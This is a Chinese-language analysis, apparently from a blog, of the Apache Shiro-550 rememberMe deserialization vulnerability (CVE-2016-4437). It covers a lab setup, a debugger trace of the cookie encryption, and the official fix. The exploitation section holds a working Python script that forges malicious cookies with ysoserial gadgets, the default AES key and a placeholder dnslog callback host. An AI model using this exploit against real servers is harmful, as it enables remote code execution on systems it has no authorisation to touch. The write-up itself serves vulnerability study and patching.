### Apache Shiro-550 反序列化漏洞分析 (CVE-2016-4437)



#### 0x00 漏洞描述

Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理等功能。

Apache Shiro 1.2.4及以前版本中，用户信息经过加密序列化后存储在名为remember-me的Cookie项中，但shiro将加密的密钥硬编码在代码里，攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。

理论上只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。



#### 0x01 漏洞原理

shiro框架原理参考https://zhuanlan.zhihu.com/p/54176956

Apache Shiro框架提供了记住我的功能（RememberMe），关闭了浏览器下次再打开时还是能记住你是谁，下次访问时无需再登录即可访问。用户登陆成功后会生成经过加密并编码的cookie。

Apache Shiro 1.2.4及以前版本中，Cookie的处理流程如下：

1、检索RememberMe cookie 的值
2、Base 64解码
3、使用AES解密(加密密钥硬编码)
4、进行反序列化操作（未作过滤处理）

但是，AES加密的密钥Key被硬编码在代码里，这样攻击者就可以通过key构造一个恶意的Cookie发送到服务端，Shiro将Cookie中的rememberMe字段进行解密并且反序列化，从而造成反序列化漏洞。



#### 0x02 漏洞环境搭建

从github拉取漏洞源码

```shell
git clone https://github.com/apache/shiro.git
git checkout shiro-root-1.2.4  #切换分支
```

在IDE中打开shiro/samples/web项目

![image-20220712132115814](/Users/luka077/Library/Application Support/typora-user-images/image-20220712132115814.png)

修改pom.xml，添加commons-collections4依赖，并把jstl版本改为1.2

![image-20220712133907547](/Users/luka077/Library/Application Support/typora-user-images/image-20220712133907547.png)

![image-20220712133922788](/Users/luka077/Library/Application Support/typora-user-images/image-20220712133922788.png)

Tomcat 版本8.5.79

Maven 3.8.1

JDK 1.6.0

![image-20220712135326828](/Users/luka077/Library/Application Support/typora-user-images/image-20220712135326828.png)

添加tomcat服务器，安装的版本为tomcat 8.5.79

![image-20220712134448428](/Users/luka077/Library/Application Support/typora-user-images/image-20220712134448428.png)

![image-20220712135421953](/Users/luka077/Library/Application Support/typora-user-images/image-20220712135421953.png)

运行项目，出现如下界面即为部署成功

![image-20220712135651022](/Users/luka077/Library/Application Support/typora-user-images/image-20220712135651022.png)

#### 0x03 漏洞分析

点击log in，尝试登录，抓包看下通信内容

![image-20220712221521012](/Users/luka077/Library/Application Support/typora-user-images/image-20220712221521012.png)

![image-20220712221644256](/Users/luka077/Library/Application Support/typora-user-images/image-20220712221644256.png)

可以看到登录时将用户名密码post到服务端，且设置了rememberMe=on，服务端的回包中则包含了rememberMe的内容



打开IDE，shiro-core-1.2.4.jar的结构如下，漏洞点就在mgt中

![image-20220712223035643](/Users/luka077/Library/Application Support/typora-user-images/image-20220712223035643.png)

![image-20220712223201868](/Users/luka077/Library/Application Support/typora-user-images/image-20220712223201868.png)



先来看登录信息的**加密过程**

找到DefaultSecurityManager下的login函数，设置断点，然后发起一次log in请求，勾选rememberMe

![image-20220712230646221](/Users/luka077/Library/Application Support/typora-user-images/image-20220712230646221.png)

跟进入onSuccessfulLogin函数中，调用了remerberMeSuccessfulLogin，继续跟进

![image-20220712230752026](/Users/luka077/Library/Application Support/typora-user-images/image-20220712230752026.png)

![image-20220712230846923](/Users/luka077/Library/Application Support/typora-user-images/image-20220712230846923.png)

创建RememberMeManager对象后，调用onSuccessfulLogin

![image-20220712231042991](/Users/luka077/Library/Application Support/typora-user-images/image-20220712231042991.png)

跟进rememberIdentity函数中，该函数将执行加密操作，将root转为字节序列

![image-20220712231900599](/Users/luka077/Library/Application Support/typora-user-images/image-20220712231900599.png)

进入convertPrincipalsToBytes中，看下如何执行加密操作

![image-20220712232141651](/Users/luka077/Library/Application Support/typora-user-images/image-20220712232141651.png)

将root传入serialize函数进行序列化，跟进serialize即可看到熟悉的writeObject

![image-20220712232218034](/Users/luka077/Library/Application Support/typora-user-images/image-20220712232218034.png)

![image-20220712232414564](/Users/luka077/Library/Application Support/typora-user-images/image-20220712232414564.png)

![image-20220712232533707](/Users/luka077/Library/Application Support/typora-user-images/image-20220712232533707.png)

然后将序列化后的数据传入encrypt函数执行加密操作，跟进encrypt看下加密过程

![image-20220712232645444](/Users/luka077/Library/Application Support/typora-user-images/image-20220712232645444.png)

函数首先创建了一个CipherService加密器，加密采用AES算法执行，具体参数如下

![image-20220712232922009](/Users/luka077/Library/Application Support/typora-user-images/image-20220712232922009.png)

AES是对称加密算法，且需要一个key值来执行加密

![image-20220712233111949](/Users/luka077/Library/Application Support/typora-user-images/image-20220712233111949.png)

而getEncryptionCipherKey函数的**加密key值却是硬编码在代码里**的，这就是**漏洞产生的原因**，给了攻击者伪造rememberMe内容的机会，key值获取如下所示

![image-20220712233200044](/Users/luka077/Library/Application Support/typora-user-images/image-20220712233200044.png)

![image-20220712233311901](/Users/luka077/Library/Application Support/typora-user-images/image-20220712233311901.png)

![image-20220712233406233](/Users/luka077/Library/Application Support/typora-user-images/image-20220712233406233.png)

执行完加密后将加密的数值进行base64编码后写入Cookie的rememberMe中

![image-20220712234129567](/Users/luka077/Library/Application Support/typora-user-images/image-20220712234129567.png)

![image-20220712234201324](/Users/luka077/Library/Application Support/typora-user-images/image-20220712234201324.png)

至此，完成加密写cookie的动作

**解密过程**和加密过程刚好相反，在decrypt函数下断点进行跟进分析即可，同样使用的是硬编码的key值

![image-20220712234431109](/Users/luka077/Library/Application Support/typora-user-images/image-20220712234431109.png)

加密顺序为序列化 --> AES加密 --> base64编码，在函数convertPrincipalsToBytes中实现

解密顺序为base64解码 --> AES解密 --> 反序列化，在函数convertBytesToPrincipals中实现

上述过程自行打断点跟进调试即可



#### 0x04 漏洞利用

漏洞利用的关键点是利用硬编码的key值构造恶意cookie，通过恶意cookie值来触发反序列化漏洞

Java反序列化利用神器ysoserial

git clone https://github.com/frohoff/ysoserial.git

参照readme进行编译，我使用的是jdk 1.7.0 和maven 3.8.1，可参考这篇文章https://www.anquanke.com/post/id/229108

编译完成后会在target目录生成ysoserial-0.0.6-SNAPSHOT-all.jar和ysoserial-0.0.6-SNAPSHOT.jar



生成恶意cookie的脚本Shiro-poc.py如下所示

```python
import base64
import uuid
import subprocess
from Crypto.Cipher import AES


def rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'URLDNS', command], stdout=subprocess.PIPE)
    #popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'CommonsCollections5', command], stdout=subprocess.PIPE)
    # popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = "kPH+bIxk5D2deZiIxcaaaA=="  # 默认key值
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


if __name__ == '__main__':
    #payload = rememberme('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
    payload = rememberme('http://xxxxxx.dnslog.cn')
    with open("./payload.cookie", "w") as fpw:
        print("rememberMe={}".format(payload.decode()))
```



尝试使用DNSLOG的方式进行验证

首先打开www.dnslog.cn，获取一个subdomain xxxxxx.dnslog.cn，然后将脚本中的域名改为xxxxxx.dnslog.cn

执行python Shiro-poc.py生成payload格式如下(这里要注意下环境中默认java的版本，部分版本会报错，测试使用的版本为1.8.0_333)

![image-20220713131507205](/Users/luka077/Library/Application Support/typora-user-images/image-20220713131507205.png)

打开Burpsuite，把请求中的rememberMe内容换成payload中的内容，再次发送请求

![image-20220715155809884](/Users/luka077/Library/Application Support/typora-user-images/image-20220715155809884.png)

查看dnslog的记录，已经收到了请求，漏洞触发成功

tips：感觉触发漏洞的时机没有掌握好，本地调试过程中，发现如果是先登录成功之后，找其中任意一个请求包，把cookie中添加攻击payload再发送，并没有攻击成功。实际测试上，如果把服务端重启下，清掉浏览器缓存，然后发送任意带攻击payload的请求，100%可以成功。

不懂，后续再调试下看准确的触发时机是什么

![image-20220715155847062](/Users/luka077/Library/Application Support/typora-user-images/image-20220715155847062.png)



坑点：环境中的CC链可能攻击失败，但是URLDNS这个Gadget无需其他依赖，因为URLDNS类就存在于JDK环境中，其已集成在ysoserial中，我们直接用就可以了

使用dnslog的方式可以探测是否存在漏洞，但要利用漏洞执行命令还是要使用CC链



#### 0x05 漏洞修复

![image-20220715161309373](/Users/luka077/Library/Application Support/typora-user-images/image-20220715161309373.png)

官方修复方法中把原先使用的默认key值改为了随机生成的key值

补丁地址：

https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848



#### 0x06 参考

https://www.cnblogs.com/backlion/p/14077804.html

https://www.mi1k7ea.com/2020/10/03/%E6%B5%85%E6%9E%90Shiro-rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88Shiro550%EF%BC%89/

https://xz.aliyun.com/t/7950#toc-4

https://www.anquanke.com/post/id/225442#h3-8

https://www.anquanke.com/post/id/229108